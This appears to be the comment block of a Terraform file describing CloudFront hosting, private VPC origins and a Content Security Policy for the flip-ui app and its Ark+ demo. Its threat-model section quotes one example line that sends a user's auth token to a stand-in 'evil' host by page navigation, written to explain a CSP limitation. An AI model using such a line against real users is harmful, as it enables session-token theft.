# CloudFront hosting for the flip-ui SPA.
#
# Users continue to hit the canonical subdomain
# (stag.flip.aicentre.co.uk / app.flip.aicentre.co.uk); that A-record
# (aws_route53_record.alb in main.tf) aliases this CloudFront distribution.
#
# CloudFront serves the UI static bundle from S3 (default behavior) and
# forwards /api/* to the (internal) ALB via aws_cloudfront_vpc_origin —
# CloudFront provisions an AWS-managed ENI inside our VPC and dials the
# ALB privately. The ALB has no public IP and no internet-facing path:
# its security group accepts ingress on 443 only from the AWS-managed
# CloudFront-VPCOrigins-Service-SG (see aws_security_group_rule.alb_ingress_https_from_cloudfront
# below) — Option 2 from
# https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/private-content-vpc-origins.html.
#
# Origin TLS: CloudFront sets the Host header to var.flip_alb_subdomain
# and the ALB's default listener cert (aws_acm_certificate.flip, see
# main.tf) covers that name, so origin TLS validation passes without
# the legacy api.<subdomain> SNI cert chain.

# Public Ark+ demo download assets (optional; prod only)
#
# The demo SPA (flip-ui `npm run build:demo`) offers multi-hundred-MB result
# and model-file bundles for download. Serving them straight from a public
# S3 prefix exposes raw S3 egress rates to anonymous hotlinking with no
# throttle; fronting them with CloudFront puts the WAF (rate-limit rule
# above) and CloudFront's cheaper egress in the path, and lets the bucket
# drop ALL public access — CloudFront reads it via OAC, exactly like the
# flip-ui bucket.
#
# The bucket is deliberately not Terraform-managed: its lifecycle is manual
# (bundles are staged by hand per demo release) and it must survive
# `make destroy`. Terraform manages the access edges only: the
# public-access block, the OAC-scoped bucket policy, and the CloudFront
# origin + /ark_demo/assets/* behavior on the main distribution.
# Everything is gated on DEMO_ASSETS_BUCKET_NAME being non-empty.

# Response headers policy (Ark+ demo SPA, /ark_demo/* only)
############################

# The demo shares the flip-ui S3 bucket/distribution/origin with the real,
# authenticated app (same-origin hosting — a separate subdomain was considered
# and rejected during review).
#
# THIS POLICY IS DEFENCE IN DEPTH, NOT AN ORIGIN-ISOLATION BOUNDARY. An earlier
# revision of this comment claimed `connect-src 'none'` meant a hypothetical XSS
# in the demo bundle would have "nowhere on the network to send" a token read
# out of this origin's localStorage. That reasoning does not hold and was
# corrected in review (FLIP#794):
#
#   * CSP has NO directive governing top-level navigation. `navigate-to` was
#     dropped from CSP3 and ships in no browser; `form-action` covers form
#     submission only. `location.href = "https://evil/?t=" + token` is
#     unaffected by anything in this policy.
#   * Same-origin hosting gives the demo bundle full access to the real app's
#     localStorage and cookies no matter what this header says. connect-src
#     constrains where the page may *connect*, not what it may *read*.
#
# So the residual risk is real and accepted: a script-injection bug in the demo
# bundle could read a signed-in user's Cognito tokens from the shared origin and
# exfiltrate them by navigation. What actually keeps that closed today is that
# the demo has no injection sink — no v-html/innerHTML outside a test file, and
# a register that is static JSON compiled into the bundle rather than
# attacker-supplied input — plus the fact that it never runs authenticated code
# paths. A separate origin (e.g. demo.flip.aicentre.co.uk) is the only control
# that would genuinely separate the two token stores; treat that as the fix if
# the demo ever grows a dynamic content path.
#
# What this policy DOES buy: it blocks the whole fetch/XHR/WebSocket class of
# exfiltration and any third-party resource load, which is the cheap majority of
# the attack surface, and it enforces the "zero egress" property the demo design
# rests on. The demo's Mirage mock never touches the real browser network stack
# (Pretender replaces window.XMLHttpRequest/fetch outright), so `connect-src
# 'none'` costs no demo functionality — confirmed by the PR's Chrome net-log
# audit (no egress besides 127.0.0.1) and by the mocks/__tests__ egress spec.
#
# Shipped enforcing (not report-only), unlike flip_ui_spa's CSP: every resource
# the demo loads is 'self' (no third-party CDN that could break
# unpredictably), and there is no established live-traffic population to observe
# for false positives the way the real app's CSP rollout needed. Note the demo
# therefore enforces `style-src 'self'` while the real app still runs that
# report-only — worth an eyeball on any page that injects a runtime <style>
# (CodeMirror does, on the cohort-query page) before a public launch.
